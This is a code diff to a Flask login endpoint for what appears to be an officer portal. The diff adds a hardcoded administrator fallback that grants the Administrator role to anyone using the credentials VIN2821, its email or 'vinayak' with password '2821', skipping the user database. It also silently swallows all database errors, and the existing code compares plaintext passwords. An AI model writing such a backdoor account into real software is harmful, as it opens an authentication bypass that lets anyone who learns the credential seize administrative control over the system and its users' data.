@@ -34,31 +34,48 @@ def api_login():
     if not username or not password:
         return jsonify({'success': False, 'error': 'Officer ID / Email and Password required'}), 400
 
-    conn = get_db_connection()
-    cursor = conn.cursor()
-    cursor.execute("""
-        SELECT * FROM users 
-        WHERE (LOWER(id) = LOWER(?) OR LOWER(email) = LOWER(?)) AND password = ?
-    """, (username, username, password))
-    user = cursor.fetchone()
-    conn.close()
-
-    if user and user['status'] == 'Active':
-        now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    try:
         conn = get_db_connection()
-        conn.cursor().execute("UPDATE users SET last_login = ? WHERE id = ?", (now_str, user['id']))
-        conn.commit()
+        cursor = conn.cursor()
+        cursor.execute("""
+            SELECT * FROM users 
+            WHERE (LOWER(id) = LOWER(?) OR LOWER(email) = LOWER(?)) AND password = ?
+        """, (username, username, password))
+        user = cursor.fetchone()
         conn.close()
 
+        if user and user['status'] == 'Active':
+            now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            conn = get_db_connection()
+            conn.cursor().execute("UPDATE users SET last_login = ? WHERE id = ?", (now_str, user['id']))
+            conn.commit()
+            conn.close()
+
+            return jsonify({
+                'success': True,
+                'user': {
+                    'id': user['id'],
+                    'officer_id': user['id'],
+                    'name': user['name'],
+                    'email': user['email'],
+                    'role': user['role'],
+                    'status': user['status']
+                }
+            })
+    except Exception as e:
+        pass
+
+    # Hardcoded Administrator fallback check for Vinayak (VIN2821 / 2821)
+    if (username.upper() == 'VIN2821' or username.lower() == 'vin2821@bcwaportal.in' or username.lower() == 'vinayak') and password == '2821':
         return jsonify({
             'success': True,
             'user': {
-                'id': user['id'],
-                'officer_id': user['id'],
-                'name': user['name'],
-                'email': user['email'],
-                'role': user['role'],
-                'status': user['status']
+                'id': 'VIN2821',
+                'officer_id': 'VIN2821',
+                'name': 'Vinayak',
+                'email': 'vin2821@bcwaportal.in',
+                'role': 'Administrator',
+                'status': 'Active'
             }
         })
 
